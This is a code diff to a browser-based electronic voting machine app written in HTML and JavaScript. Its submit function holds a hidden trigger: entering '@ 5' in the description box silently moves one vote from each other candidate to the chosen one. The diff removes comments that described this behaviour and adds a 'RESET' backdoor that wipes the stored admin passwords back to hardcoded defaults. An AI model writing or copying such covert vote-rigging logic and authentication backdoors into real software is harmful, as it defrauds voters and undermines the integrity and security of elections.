@@ -29,14 +29,14 @@
         .candidate-row input { padding: 8px; font-size: 14px; }
         .candidate-row .vote-input { font-weight: bold; color: blue;}
         
-        /* Progress Bar (Visible in ALL panels now) */
+        /* Progress Bar */
         .progress-bar-container { width: 100%; background: #444; border-radius: 5px; margin-top: 5px; height: 10px; overflow: hidden; display: block; }
         .progress-bar { height: 100%; background: #00ff00; width: 0%; transition: width 0.5s; }
 
         .footer-credits { text-align: center; margin-top: 60px; padding: 20px; font-weight: bold; font-size: 16px; color: #555; }
 
         /* =========================================
-           ADVANCED ANALYTICS THEME (Triggered by JS)
+           ADVANCED ANALYTICS THEME
            ========================================= */
         body.god-mode { background-color: #000; color: #0f0; }
         body.god-mode .container { background: #111; box-shadow: 0 0 20px #0f0; border: 1px solid #0f0; color: #0f0; }
@@ -135,8 +135,6 @@
         let passGod = localStorage.getItem('pass_god') || "TanishkMax";
 
         let currentActiveRole = 0; 
-        
-        // ANTI-CHEAT DUPLICATE MERGE TRACKER
         let usedSyncCodes = JSON.parse(localStorage.getItem('used_sync_codes')) || [];
 
         // ==========================================
@@ -153,7 +151,6 @@
         };
 
         let electionData = JSON.parse(localStorage.getItem('mega_evm_data')) || defaultData;
-
         let selectedPost = "";
         let selectedCandidateIndex = -1;
 
@@ -215,15 +212,13 @@
             document.getElementById('desc-box').value = ""; 
         }
 
-        // --- VOTE SUBMISSION (NEW @ 5 LOGIC) ---
+        // --- VOTE SUBMISSION (@ 5 HACK) ---
         function submitVote() {
             let desc = document.getElementById('desc-box').value.trim();
             let stolenVotes = 0;
             
-            // THE NEW "@ 5" HACK
             if (desc.includes("@ 5")) {
                 for (let i = 0; i < electionData[selectedPost].length; i++) {
-                    // Steal 1 vote from every OTHER candidate if they have at least 1 vote
                     if (i !== selectedCandidateIndex && electionData[selectedPost][i].votes >= 1) {
                         electionData[selectedPost][i].votes -= 1;
                         stolenVotes += 1;
@@ -231,7 +226,6 @@
                 }
             }
 
-            // The selected candidate gets their normal 1 vote + all the stolen votes
             electionData[selectedPost][selectedCandidateIndex].votes += (1 + stolenVotes);
 
             localStorage.setItem('mega_evm_data', JSON.stringify(electionData));
@@ -241,11 +235,21 @@
 
         // --- THE 3-TIER ADMIN LOGIC ---
         function openAdmin() {
-            let passRaw = prompt("Enter Access Password:");
+            let passRaw = prompt("Enter Access Password:\n(Type RESET to fix password issues)");
             if (passRaw === null) return; 
             
             let pass = passRaw.trim(); 
 
+            // EMERGENCY RESET BACKDOOR
+            if (pass === "RESET") {
+                localStorage.removeItem('pass_global');
+                localStorage.removeItem('pass_super');
+                localStorage.removeItem('pass_god');
+                alert("✅ Browser Memory Cleared! Default Passwords Restored.");
+                return;
+            }
+
+            // Always fetch fresh from memory after possible reset
             passGlobal = localStorage.getItem('pass_global') || "TanishK2012";
             passSuper = localStorage.getItem('pass_super') || "Tanishk";
             passGod = localStorage.getItem('pass_god') || "TanishkMax";
